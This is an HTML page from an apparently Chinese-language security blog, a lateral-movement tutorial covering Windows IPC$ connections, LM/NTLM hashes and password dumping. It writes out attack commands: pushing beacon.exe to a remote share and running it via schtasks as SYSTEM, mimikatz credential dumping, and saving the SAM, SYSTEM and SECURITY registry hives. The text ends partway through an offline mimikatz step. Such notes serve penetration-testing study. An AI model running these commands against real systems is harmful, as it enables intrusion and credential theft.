

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <link rel="icon" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <meta name="description" content="æ¨ªå‘ç§»åŠ¨IPCIPC(Inter Process Connection)å…±äº«å‘½åç®¡é“çš„èµ„æºï¼Œæ˜¯ä¸ºäº†å®ç°è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ã€‚IPCå¯ä»¥é€šè¿‡éªŒè¯ç”¨æˆ·åå’Œå¯†ç è·å–ç›¸åº”æƒé™ï¼Œé€šå¸¸åœ¨è¿œç¨‹ç®¡ç†è®¡ç®—æœºå’ŒæŸ¥çœ‹è®¡ç®—æœºçš„å…±äº«èµ„æºæ—¶ä½¿ç”¨ é€šè¿‡ipc$å¯ä»¥ä¸ç›®æ ‡æœºå™¨å»ºç«‹è¿æ¥ã€‚åˆ©ç”¨è¿™ä¸ªè¿æ¥ï¼Œä¸ä»…å¯ä»¥è®¿é—®ç›®æ ‡æœºå™¨åªèƒ½å¤Ÿçš„æ–‡ä»¶ï¼Œè¿›è¡Œä¸Šä¼ ã€ä¸‹è½½ç­‰æ“ä½œï¼Œè¿˜å¯ä»¥åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œå…¶ä»–å‘½ä»¤ï¼Œä»¥è·å–ç›®æ ‡æœºå™¨çš„ç›®å½•ç»“æ„ã€ç”¨æˆ·åˆ—è¡¨ç­‰ä¿¡">
<meta property="og:type" content="article">
<meta property="og:title" content="æ¨ªå‘ç§»åŠ¨">
<meta property="og:url" content="http://example.com/2022/03/31/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
<meta property="og:site_name" content="ğŸ—„">
<meta property="og:description" content="æ¨ªå‘ç§»åŠ¨IPCIPC(Inter Process Connection)å…±äº«å‘½åç®¡é“çš„èµ„æºï¼Œæ˜¯ä¸ºäº†å®ç°è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ã€‚IPCå¯ä»¥é€šè¿‡éªŒè¯ç”¨æˆ·åå’Œå¯†ç è·å–ç›¸åº”æƒé™ï¼Œé€šå¸¸åœ¨è¿œç¨‹ç®¡ç†è®¡ç®—æœºå’ŒæŸ¥çœ‹è®¡ç®—æœºçš„å…±äº«èµ„æºæ—¶ä½¿ç”¨ é€šè¿‡ipc$å¯ä»¥ä¸ç›®æ ‡æœºå™¨å»ºç«‹è¿æ¥ã€‚åˆ©ç”¨è¿™ä¸ªè¿æ¥ï¼Œä¸ä»…å¯ä»¥è®¿é—®ç›®æ ‡æœºå™¨åªèƒ½å¤Ÿçš„æ–‡ä»¶ï¼Œè¿›è¡Œä¸Šä¼ ã€ä¸‹è½½ç­‰æ“ä½œï¼Œè¿˜å¯ä»¥åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œå…¶ä»–å‘½ä»¤ï¼Œä»¥è·å–ç›®æ ‡æœºå™¨çš„ç›®å½•ç»“æ„ã€ç”¨æˆ·åˆ—è¡¨ç­‰ä¿¡">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200807162946-26dfbf56-d888-1.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200807163204-78c2e474-d888-1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220102572.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220228030.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220447046.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404135504518.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/psexec.gif">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405133254579.png">
<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405134813532.png">
<meta property="article:published_time" content="2022-03-31T04:51:36.018Z">
<meta property="article:modified_time" content="2022-04-11T03:07:59.854Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="knowledge">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200807162946-26dfbf56-d888-1.png">
  
  <title>æ¨ªå‘ç§»åŠ¨ - ğŸ—„</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-dark-dimmed.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  


<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->

  
<link rel="stylesheet" href="/css/macpanel.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>ğŸ‘©â€ğŸ’»</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://raw.githubusercontent.com/kIl3rr/photo/main/post.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="æ¨ªå‘ç§»åŠ¨">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-03-31 12:51" pubdate>
        March 31, 2022 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      16k å­—
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      NaN åˆ†é’Ÿ
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">æ¨ªå‘ç§»åŠ¨</h1>
            
            <div class="markdown-body">
              <h1 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>IPC(Inter Process Connection)å…±äº«<code>å‘½åç®¡é“</code>çš„èµ„æºï¼Œæ˜¯ä¸ºäº†å®ç°è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ã€‚<code>IPC</code>å¯ä»¥é€šè¿‡éªŒè¯ç”¨æˆ·åå’Œå¯†ç è·å–ç›¸åº”æƒé™ï¼Œé€šå¸¸åœ¨è¿œç¨‹ç®¡ç†è®¡ç®—æœºå’ŒæŸ¥çœ‹è®¡ç®—æœºçš„å…±äº«èµ„æºæ—¶ä½¿ç”¨</p>
<p>é€šè¿‡<code>ipc$</code>å¯ä»¥ä¸ç›®æ ‡æœºå™¨å»ºç«‹è¿æ¥ã€‚åˆ©ç”¨è¿™ä¸ªè¿æ¥ï¼Œä¸ä»…å¯ä»¥è®¿é—®ç›®æ ‡æœºå™¨åªèƒ½å¤Ÿçš„æ–‡ä»¶ï¼Œè¿›è¡Œä¸Šä¼ ã€ä¸‹è½½ç­‰æ“ä½œï¼Œè¿˜å¯ä»¥åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œå…¶ä»–å‘½ä»¤ï¼Œä»¥è·å–ç›®æ ‡æœºå™¨çš„ç›®å½•ç»“æ„ã€ç”¨æˆ·åˆ—è¡¨ç­‰ä¿¡æ¯</p>
<p>å»ºç«‹ä¸€ä¸ª<code>ipc$</code>å¹¶æŸ¥çœ‹å½“å‰è¿æ¥è¾“å…¥å¦‚ä¸‹å‘½ä»¤</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\ip\ipc$ &quot;password&quot; /user:administrator<br><span class="hljs-built_in">net</span> use<br></code></pre></td></tr></table></figure>

<p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong>å¼€å¯139(NetBIOS)ã€445ç«¯å£ï¼Œç®¡ç†å‘˜å¼€å¯äº†é»˜è®¤å…±äº«ï¼Œä¸€èˆ¬é»˜è®¤å¼€å¯ï¼Œå¯¹åº”çš„é€»è¾‘ç›˜ä¹Ÿå¯ä»¥è®¿é—®åˆ°</p>
<p><strong>æŠ¥é”™ï¼š</strong></p>
<ul>
<li>é”™è¯¯å·5:æ‹’ç»è®¿é—®</li>
<li>é”™è¯¯å·51:windowsæ— æ³•æ‰¾åˆ°ç½‘ç»œè·¯å¾„ï¼Œå³ç½‘ç»œä¸­å­˜åœ¨é—®é¢˜</li>
<li>é”™è¯¯å·53:æ‰¾ä¸åˆ°ç½‘ç»œè·¯å¾„ï¼ŒåŒ…æ‹¬IPåœ°å€é”™è¯¯ã€ç›®æ ‡æœªå¼€æœºã€ç›®æ ‡lanmanserveræœåŠ¡æœªå¯åŠ¨ã€ç›®æ ‡æœ‰é˜²ç«å¢™ï¼ˆç«¯å£è¿‡æ»¤ï¼‰</li>
<li>é”™è¯¯å·67:æ‰¾ä¸åˆ°ç½‘ç»œåï¼ŒåŒ…æ‹¬lanmanworkstationæœåŠ¡æœªå¯åŠ¨ã€ipc$å·²è¢«åˆ é™¤</li>
<li>é”™è¯¯å·1219:æä¾›çš„å‡­æ®ä¸å·²å­˜åœ¨çš„å‡­æ®é›†å†²çªã€‚ä¾‹å¦‚ï¼Œå·²ç»å’Œç›®æ ‡å»ºç«‹äº†ipc$,éœ€è¦åœ¨åˆ é™¤åŸè¿æ¥åé‡æ–°è¿›è¡Œè¿æ¥</li>
<li>é”™è¯¯å·1326:æœªçŸ¥çš„ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯</li>
<li>é”™è¯¯å·1792:è¯•å›¾ç™»å½•ï¼Œä½†æ˜¯ç½‘ç»œç™»å½•æœåŠ¡æ²¡æœ‰å¯åŠ¨ï¼ŒåŒ…æ‹¬ç›®æ ‡NetLoginæœåŠ¡æœªå¯åŠ¨ï¼ˆè¿æ¥åŸŸæ§åˆ¶å™¨æ—¶ä¼šå‡ºç°æ­¤æƒ…å†µï¼‰</li>
<li>é”™è¯¯å·2242:æ­¤ç”¨æˆ·çš„å¯†ç å·²ç»è¿‡æœŸã€‚ä¾‹å¦‚ï¼Œç›®æ ‡æœºå™¨è®¾ç½®äº†è´¦å·ç®¡ç†ç­–ç•¥ï¼Œå¼ºåˆ¶ç”¨æˆ·å®šæœŸä¿®æ”¹å¯†ç </li>
</ul>
<p>IPCå»ºç«‹å</p>
<blockquote>
<p>dir \\ip\C$</p>
<p>tasklist /S ip /U administrator /P 123456</p>
<p>net time \\ip</p>
<p>copy beacon.exe \\ip\C$</p>
<p>at \\ip  19:00:00 C:\beacon.exe</p>
<p>at \\ip /delete</p>
<p>//Windows Vistaã€windows server2008åŠä¹‹åç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿå·²å°†atå‘½ä»¤åºŸå¼ƒäº†</p>
<p>schtasks /create /s ip /tn test /sc onstart c:\beacon.exe /ru system /f</p>
<p>schtasks /run /s ip /i /tn â€œtestâ€</p>
<p>schtasks /delete /s ip  /tn â€œtestâ€ /f</p>
<p>net use \\ip  /del /y</p>
</blockquote>
<h2 id="Windows-hash"><a href="#Windows-hash" class="headerlink" title="Windows hash"></a>Windows hash</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8117#toc-16">https://xz.aliyun.com/t/8117#toc-16</a></p>
<p>Windowsè®¤è¯åè®®æœ‰ä¸¤ç§NTLMï¼ˆNT LAN Managerï¼‰å’ŒKerberosï¼Œå‰è€…ä¸»è¦åº”ç”¨äºç”¨äºWindows NT å’Œ Windows 2000 Serverï¼ˆor  Laterï¼‰ å·¥ä½œç»„ç¯å¢ƒï¼Œè€Œåè€…åˆ™ä¸»è¦åº”ç”¨äºWindows 2000 Serverï¼ˆor Laterï¼‰ åŸŸï¼ˆDomainï¼‰ç¯å¢ƒ</p>
<h3 id="LM-Hash-amp-NTLM-Hash"><a href="#LM-Hash-amp-NTLM-Hash" class="headerlink" title="LM Hash&amp;NTLM Hash"></a>LM Hash&amp;NTLM Hash</h3><p>windowsæ“ä½œç³»ç»Ÿå¯†ç ä¸€èˆ¬ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€éƒ¨åˆ†ä¸º<code>LM Hash</code>å¦ä¸€éƒ¨åˆ†ä¸º<code>NTLM Hash</code>åœ¨Windowsä¸­ï¼ŒHashçš„ç»“æ„é€šå¸¸å¦‚ä¸‹</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>RID:LM-HASH:NT-HASH<br></code></pre></td></tr></table></figure>

<p><strong>LM Hash</strong>å…¨åä¸º<code>LAN Manager Hash</code>æ˜¯å¾®è½¯ä¸ºäº†æé«˜windowsæ“ä½œç³»ç»Ÿçš„å®‰å…¨æ€§èƒ½è€Œé‡‡ç”¨çš„æ•£åˆ—åŠ å¯†ç®—æ³•ï¼Œå…¶<strong>æœ¬è´¨æ˜¯DESåŠ å¯†ï¼Œå¯†ç ä¸è¶³14å­—èŠ‚å°†ç”¨0è¡¥å…¨</strong>ã€‚LM Hashè¾ƒå®¹æ˜“ç ´è§£ï¼Œä½†å¾®è½¯ä»…ä»…æ˜¯å°†LM Hashç¦ç”¨äº†<code>ä»windows Vistaå’Œwindows server 2008ç‰ˆæœ¬å¼€å§‹ï¼ŒWindowsæ“ä½œç³»ç»Ÿé»˜è®¤ç¦ç”¨LM Hash</code>ã€‚LM Hashæ˜æ–‡å¯†ç é™å®šåœ¨14ä½ä»¥å†…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè¦åœæ­¢ä½¿ç”¨LM Hash å°†ç”¨æˆ·å¯†ç è®¾ç½®ä¸º14ä½ä»¥ä¸Šå³å¯ã€‚å¦‚æœæŠ“å–çš„LM Hashé€šå¸¸ä¸º<strong>AAD3B435B51404EEAAD3B435B51404EE</strong>è¡¨ç¤º<strong>å¯†ç ä¸ºç©ºæˆ–<code>LM Hash</code>è¢«ç¦ç”¨</strong></p>
<p><strong>NTLM Hash</strong>æ˜¯å¾®è½¯ä¸ºäº†æé«˜å®‰å…¨æ€§çš„åŒæ—¶å…¼å®¹è€Œè®¾è®¡çš„æ•£åˆ—åŠ å¯†ç®—æ³•ã€‚NTLM Hash æ˜¯<strong>åŸºäºMD4åŠ å¯†ç®—æ³•</strong>è¿›è¡ŒåŠ å¯†çš„ã€‚ä¸ªäººç‰ˆä»Windows vista æœåŠ¡å™¨ç‰ˆä»windows server2003ä»¥åï¼Œwindowsæ“ä½œç³»ç»Ÿçš„è®¤è¯æ–¹å¼å‡ä¸ºNTLM Hash</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200807162946-26dfbf56-d888-1.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>Net-NTLM Hash</strong></p>
<p>å­˜åœ¨ä¸¤ä¸ªç‰ˆæœ¬</p>
<p><strong>Net-NTLMv1:window2003å’Œwindow xpä¹‹å‰é»˜è®¤å¯ç”¨</strong></p>
<p>Net-ntlm hash v1çš„æ ¼å¼ä¸ºusername::hostname:LM response:NTLM response:challenge</p>
<p>ç”±äºv1ç‰ˆæœ¬çš„åŠ å¯†æ–¹å¼æ¯”è¾ƒè„†å¼±ï¼Œå¾ˆå®¹æ˜“è§£å¯†å¾—åˆ°NTLM Hash,åŸºæœ¬åœ¨å¯æ§æ—¶é—´å†…èƒ½è§£å‡ºã€‚</p>
<p><strong>Net-NTLMv2:window2008 å’Œ window Vistä¹‹åé»˜è®¤å¯ç”¨</strong></p>
<p>Net-ntlm hash v2çš„æ ¼å¼ä¸ºusername::domain:challenge:HMAC-MD5:blob</p>
<p>v2ç‰ˆæœ¬,åŠ å¯†æ–¹å¼æ¯”è¾ƒå¼ºï¼Œä½†æ˜¯å¯ä»¥è¿›è¡Œæ˜æ–‡çˆ†ç ´ï¼Œåˆ©ç”¨éš¾åº¦æ¯”è¾ƒå¤§ã€‚</p>
<p>NTLMä½¿ç”¨åœ¨Windows NTå’ŒWindows 2000 Serverï¼ˆor  laterï¼‰å·¥ä½œç»„ç¯å¢ƒä¸­ï¼ˆKerberosç”¨åœ¨åŸŸæ¨¡å¼ä¸‹ï¼‰ï¼›åœ¨ADåŸŸç¯å¢ƒä¸­ï¼Œå¦‚æœéœ€è¦è®¤è¯Windows  NTç³»ç»Ÿï¼Œä¹Ÿå¿…é¡»é‡‡ç”¨NTLMã€‚NTLMä¸»è¦æ˜¯ä¸€ç§<strong>åŸºäºæŒ‘æˆ˜ï¼ˆchallengeï¼‰/å“åº”ï¼ˆresponseï¼‰æ¶ˆæ¯äº¤äº’æ¨¡å¼çš„è®¤è¯è¿‡ç¨‹</strong>ï¼š</p>
<p>  1ã€ç”¨æˆ·ç™»å½•æ—¶è¾“å…¥çš„user nameã€passwordå’Œdomain nameï¼Œç„¶åClientç«¯è®¡ç®—passwordçš„hashå€¼å¹¶ä¿å­˜åœ¨æœ¬åœ°ï¼›</p>
<p>  2ã€å®¢æˆ·ç«¯å°†user nameçš„æ˜æ–‡å‘é€ç»™DCï¼›</p>
<p>  3ã€DCç”Ÿæˆä¸€ä¸ª16-byteçš„éšæœºæ•°ï¼Œå«åšchallengeï¼Œä¼ è¾“ç»™clientï¼›</p>
<p>  4ã€clientæ”¶åˆ°challengeä»¥åï¼Œåœ¨å¤åˆ¶ä¸€ä»½æ‹·è´ï¼Œç„¶åå°†å…¶ä¸­ä¸€ä¸ªchallengeç”¨password hashåŠ å¯†ï¼Œè¿™ä¸ªå«åšresponseï¼Œç„¶åå°†challengeï¼Œresponseä»¥åŠuser nameä¼ é€ç»™serverï¼›</p>
<p>  5ã€serverç«¯åœ¨æ”¶åˆ°clientä¼ é€è¿‡æ¥çš„ä¸‰ä»½å†…å®¹ä»¥åå°†å®ƒä»¬è½¬å‘ç»™DCï¼›</p>
<p>  6ã€DCåœ¨æ”¶åˆ°user nameï¼Œresponseï¼Œchallengeä»¥åï¼Œæ ¹æ®user nameåœ¨account databaseä¸­æ‰¾åˆ°å…¶å¯¹åº”çš„password hashï¼Œç„¶åç”¨è¿™ä¸ªpassword hashåŠ å¯†challengeï¼›</p>
<p>  7ã€DCå°†responseè·ŸåŠ å¯†åçš„challengeè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒåˆ™NTLMéªŒè¯æˆåŠŸã€‚DCå°†éªŒè¯ç»“æœå‘ç»™Serverï¼Œå¹¶æœ€ç»ˆè¿”å›ç»™Clientã€‚</p>
<p>  å¦‚æœæ˜¯ä½¿ç”¨æœ¬åœ°ç”¨æˆ·èº«ä»½è¿›è¡Œè®¤è¯ï¼Œåˆ™æœ‰Serveræœ¬èº«å®Œæˆè®¤è¯è¿‡ç¨‹ã€‚</p>
<p><strong>hashå‚¨å­˜ï¼šSAMæ–‡ä»¶(local)ã€NTDS.DITæ–‡ä»¶(domain)</strong></p>
<blockquote>
<p>SAM(Security Account Manager) å®‰å…¨è´¦æˆ·ç®¡ç†å™¨æ˜¯ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œåœ¨Windows  XPï¼ŒWindows Vista,windows7-10ç”¨äºå­˜å‚¨ç”¨æˆ·çš„å¯†ç ã€‚ä»–å¯ä»¥ç”¨æ¥éªŒè¯æœ¬åœ°å’Œè¿œç¨‹ç”¨æˆ·ã€‚åœ¨windows 2000 sp4  å¼€å§‹,Active Dircetory å¯¹è¿œç¨‹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚SAMä½¿ç”¨åŠ å¯†æªæ–½æ¥é˜²æ­¢æœªç»èº«ä»½éªŒè¯çš„ç”¨æˆ·è®¿é—®ç³»ç»Ÿã€‚</p>
<p>ç”¨æˆ·å¯†ç ä»¥å“ˆå¸Œæ ¼å¼å­˜å‚¨åœ¨ æ³¨å†Œè¡¨é…ç½®å•å…ƒä¸­(registry hive), ä½œä¸ºLM Hash or NTLM Hash.</p>
<p>è¿™ä¸ªæ–‡ä»¶å¯ä»¥åœ¨<code>%SystemRoot%/system32/config/SAM</code> å’Œ æŒ‚è½½åœ¨<code>HKLM/SAM</code></p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200807163204-78c2e474-d888-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200807163204-78c2e474-d888-1.png" srcset="/img/loading.gif" lazyload></a></p>
<p>WIndowsè¿è¡Œæ—¶æ— æ³•ç§»åŠ¨æˆ–è€…å¤åˆ¶SAMæ–‡ä»¶ï¼Œå› ä¸ºWindows å†…æ ¸è·å–å¹¶åœ¨SAMæ–‡ä»¶ä¸Šä¿ç•™äº†ç‹¬å çš„æ–‡ä»¶ç³»ç»Ÿé”ï¼Œå¹¶ä¸”åœ¨æ“ä½œç³»ç»Ÿå…³é—­ä¹‹å‰ä¸ä¼šé‡Šæ”¾è¯¥é”ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¤šç§æŠ€æœ¯æ¯”å¦‚pwdumpæ¥è½¬å‚¨SAMå†…å®¹çš„å†…å­˜ä¸­å‰¯æœ¬ï¼Œä»è€Œä½¿å¯†ç å“ˆå¸Œå¯ç”¨äºç¦»çº¿æš´åŠ›æ”»å‡»ã€‚</p>
<p>åæ¥ä¸ºäº†æé«˜é’ˆå¯¹ç ´è§£çš„SAMæ•°æ®åº“çš„å®‰å…¨æ€§, Microsoft åœ¨Windows NT 4.0 ä¸­å¼•å…¥äº†SYSKEYåŠŸèƒ½ã€‚è¯¥åŠŸèƒ½ä¼šä½¿ç”¨å¯†é’¥å¯¹å­˜å‚¨åœ¨SAMä¸­çš„æ‰€æœ‰æœ¬åœ°è´¦æˆ·çš„å¯†ç å“ˆå¸Œå€¼è¿›è¡ŒåŠ å¯†ã€‚å¯ä»¥é€šè¿‡<code>syskey</code>ç¨‹åºæ¥å¯ç”¨å®ƒã€‚</p>
</blockquote>
<h4 id="hashæŠ“å–"><a href="#hashæŠ“å–" class="headerlink" title="hashæŠ“å–"></a>hashæŠ“å–</h4><p>æ¯”è¾ƒè€çš„å·¥å…·ï¼š<a target="_blank" rel="noopener" href="http://www.tarasco.org/security/pwdump_7/index.html">PwDump7</a>ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage:<br>pwdump7.<span class="hljs-keyword">exe</span> (Dump <span class="hljs-built_in">system</span> passwords)<br>pwdump7.<span class="hljs-keyword">exe</span> -s <span class="hljs-symbol">&lt;samfile&gt;</span> <span class="hljs-symbol">&lt;systemfile&gt;</span> (Dump passwords from <span class="hljs-keyword">files</span>)<br>pwdump7.<span class="hljs-keyword">exe</span> -d <span class="hljs-symbol">&lt;filename&gt;</span> [destionation] (Copy filename <span class="hljs-keyword">to</span> destionation)<br>pwdump7.<span class="hljs-keyword">exe</span> -h (Show this <span class="hljs-keyword">help</span>)<br></code></pre></td></tr></table></figure>

<p>éå¸¸å‡ºåçš„å·¥å…·ï¼š<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></p>
<blockquote>
<ul>
<li>lsass.exeè¿›ç¨‹è¯»å–(å†…å­˜)</li>
</ul>
<p>privilege::debug //æå‡è‡³debugæƒé™</p>
<p>sekurlsa::logonpasswords //ä»lsass.exeçš„å†…å­˜ä¸­æŠ“å–å¯†ç hash</p>
<p>//mimikatz.exe â€œprivilege::debugâ€ â€œlogâ€ â€œsekurlsa::logonpasswordsâ€</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220102572.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li>online</li>
</ul>
<p>privilege::debug</p>
<p>token::elevate //æ¨¡æ‹Ÿä¸€ä¸ªSYSTEMä»¤ç‰Œ</p>
<p>lsadump::sam //ä»samæ–‡ä»¶å¯¼å‡ºå¯†ç hash</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220228030.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/peterdocter/quarkspwdump">QuarkPwDump</a>ï¼Œéœ€ç¼–è¯‘</p>
<p>è¿˜å¯ä»¥å¯¼å‡º<code>SAMå’ŒSYSTEM</code>æ–‡ä»¶å†æŠ“å–å¯†ç </p>
<blockquote>
<p>reg save HKLM\SYSTEM system.hive</p>
<p>reg save HKLM\SAM sam.hive</p>
<p>reg save HKLM\security security.hive</p>
</blockquote>
<p>å°†æŠŠå¯¼å‡ºçš„<code>sam.hive</code>è·Ÿ<code>system.hive</code>æ–‡ä»¶æ”¾åˆ°<code>mimikatz</code>ä¸‹</p>
<blockquote>
<ul>
<li>offline</li>
</ul>
<p>lsadump::sam /sam:sam.hive /system:system.hive</p>
